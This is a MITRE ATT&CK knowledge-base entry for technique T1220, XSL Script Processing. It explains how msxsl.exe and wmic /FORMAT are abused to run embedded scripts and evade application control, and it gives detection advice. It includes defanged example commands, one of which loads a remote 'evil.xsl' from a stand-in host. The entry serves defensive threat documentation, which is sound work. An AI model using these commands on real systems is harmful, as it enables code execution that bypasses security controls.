---
contributors:
- Avneet Singh
- Casey Smith
- Praetorian
data_sources:
- 'Module: Module Load'
- 'Process: Process Creation'
id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
mitre_attack_url: https://attack.mitre.org/techniques/T1220
name: XSL Script Processing
platforms:
- Windows
tactics:
- defense-evasion
title: defense-evasion - XSL Script Processing
---

## Technical Details

| Attribute | Details |
|-----------|----------|
| **Tactics** | defense-evasion |
| **Platforms** | Windows |
| **Data Sources** | Module: Module Load, Process: Process Creation |
| **System Requirements** | Microsoft Core XML Services (MSXML) or access to wmic.exe |
| **MITRE ATT&CK URL** | [https://attack.mitre.org/techniques/T1220](https://attack.mitre.org/techniques/T1220) |

# XSL Script Processing (attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3)

## Description
Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

## Detection
Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

## External References
- [mitre-attack](https://attack.mitre.org/techniques/T1220)
- [Reaqta MSXSL Spearphishing MAR 2018](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)
- [Twitter SquiblyTwo Detection APR 2018](https://x.com/dez_/status/986614411711442944)
- [LOLBAS Wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
- [Microsoft msxsl.exe](https://www.microsoft.com/download/details.aspx?id=21714)
- [Penetration Testing Lab MSXSL July 2017](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)
- [XSL Bypass Mar 2019](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)
- [Microsoft XSLT Script Mar 2017](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)
